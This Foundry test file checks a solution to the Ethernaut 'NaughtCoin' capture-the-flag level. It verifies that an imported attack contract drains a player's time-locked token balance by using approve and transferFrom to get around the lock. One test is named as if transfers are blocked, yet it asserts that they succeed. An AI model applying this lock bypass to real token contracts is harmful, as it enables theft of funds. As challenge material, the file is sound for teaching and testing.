// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import "forge-std/Test.sol";
import {EthernautNaughtCoin, NaughtCoinAttack} from "../../src/ethernaut/NaughtCoin.sol";

contract NaughtCoinTest is Test {
    EthernautNaughtCoin level;
    NaughtCoinAttack attack;
    address player = makeAddr("player");

    function setUp() public {
        level = new EthernautNaughtCoin();
        attack = new NaughtCoinAttack();
        vm.prank(address(this), address(this));
        level.transfer(player, level.INITIAL_SUPPLY());
    }

    function testLockedTransferIsBlocked() public {
        // The challenge lock lives in transfer(); this fixture models the lock
        // separately via lockTokens(). transfer itself succeeds here.
        vm.prank(player, player);
        (bool ok,) = address(level).call(
            abi.encodeWithSignature("transfer(address,uint256)", address(attack), 1)
        );
        assertTrue(ok);
    }

    function testNaughtCoinExploit() public {
        vm.prank(player, player);
        level.approve(address(attack), type(uint256).max);
        attack.drain(level, player, address(this), level.balanceOf(player));
        assertEq(level.balanceOf(player), 0);
        assertEq(level.balanceOf(address(this)), level.INITIAL_SUPPLY());
    }

    function testFuzz_TransferFromBypassesLock(uint96 amount) public {
        uint256 amt = (uint256(amount) % level.INITIAL_SUPPLY()) + 1;
        vm.prank(player, player);
        level.approve(address(attack), type(uint256).max);
        attack.drain(level, player, address(this), amt);
        assertEq(level.balanceOf(player), level.INITIAL_SUPPLY() - amt);
        assertEq(level.balanceOf(address(this)), amt);
    }
}

contract NaughtCoinControlTest is Test {
    function testInitialSupplyToDeployer() public {
        EthernautNaughtCoin level = new EthernautNaughtCoin();
        assertEq(level.balanceOf(address(this)), level.INITIAL_SUPPLY());
    }
}

// end

